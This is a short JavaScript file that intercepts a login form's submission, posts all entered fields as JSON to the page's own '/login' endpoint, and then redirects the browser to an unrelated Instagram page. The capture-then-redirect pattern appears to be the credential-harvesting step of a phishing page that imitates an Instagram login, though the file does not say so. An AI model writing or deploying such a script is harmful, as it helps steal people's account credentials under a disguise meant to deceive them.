document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('loginForm');

  if (!form) return;

  form.addEventListener('submit', async (event) => {
    event.preventDefault();
    const formData = new FormData(form);
    const payload = Object.fromEntries(formData.entries());

    try {
      await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      window.location.href = 'https://www.instagram.com/popular/bengaluru-wonderla/?hl=en';
    } catch (error) {
      console.error(error);
    }
  });
});
